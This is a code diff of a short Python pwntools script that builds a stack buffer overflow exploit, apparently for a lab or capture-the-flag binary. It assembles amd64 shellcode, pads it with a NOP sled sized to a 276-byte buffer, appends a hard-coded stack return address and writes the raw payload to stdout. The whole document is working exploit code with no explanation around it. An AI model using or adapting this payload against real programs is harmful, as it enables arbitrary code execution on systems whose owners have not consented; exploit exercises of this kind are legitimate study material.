@@ -1,4 +1,6 @@
+import sys
 from pwn import *
+
 context.arch = "amd64"
 
 shellcode = asm("""
@@ -15,10 +17,15 @@ shellcode = asm("""
                 syscall
                 """)
 
-bufsize = 256 
+bufsize = 276 
 nop = b"\x90"
 
-payload = nop * (bufsize - len(shellcode) + 8 + 6) + shellcode
+payload = nop * (bufsize - (len(shellcode) + 8 + 6)) + shellcode
 
-print(payload.decode('latin-1'))
+# this is the address of the buffer that needs to be replace (aquired from ./find_buffer_addr.sh)
+buff_addr = b"\x30\x95\xff\xff\xff\x7f"
+payload = payload + b"\xaa\xaa" + buff_addr
+
+sys.stdout.buffer.write(payload)
+# print(payload.decode('latin-1'))
 # print(''.join(f"\\x{b:02x}" for b in payload))
